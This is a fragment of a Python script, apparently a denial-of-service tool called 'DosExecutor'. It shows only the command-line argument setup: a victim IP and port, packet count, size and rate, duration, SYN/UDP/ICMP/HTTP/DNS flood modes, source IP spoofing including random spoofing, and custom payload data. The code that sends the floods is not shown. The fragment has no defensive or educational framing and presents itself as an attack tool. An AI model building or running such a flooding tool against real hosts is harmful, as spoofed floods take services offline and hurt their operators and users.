...
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DosExecutor')

    parser.add_argument('-t', '--target', required=True,
                        help='The target IP address of the victim.')

    parser.add_argument('-p', '--port', type=int, required=True,
                        help='The target port number to attack.')

    parser.add_argument('-np', '--num_packets', type=int, default=1000,
                        help='The number of packets to send in the attack. (default: 1000)')

    parser.add_argument('-ps', '--packet_size', type=int, default=100,
                        help='The size of each packet in bytes. (default: 100)')

    parser.add_argument('-ar', '--attack_rate', type=int, default=5,
                        help='The attack rate in packets per second. (default: 5)')

    parser.add_argument('-d', '--duration', type=int,
                        help='The duration of the attack in seconds.')

    parser.add_argument('-am', '--attack-mode', choices=["syn", "udp", "icmp", "http", "dns"], default="syn",
                        help='The attack mode to use. Choose from "syn", "udp", "icmp", "http", or "dns". (default: '
                             'syn)')

    parser.add_argument('-sp', '--spoof-ip', default=None,
                        help='The spoofed IP address to use for the attack. Use "random" for random spoofing.')

    parser.add_argument('--data', type=str, default=None,
                        help='A custom data string to include in the attack packets.')
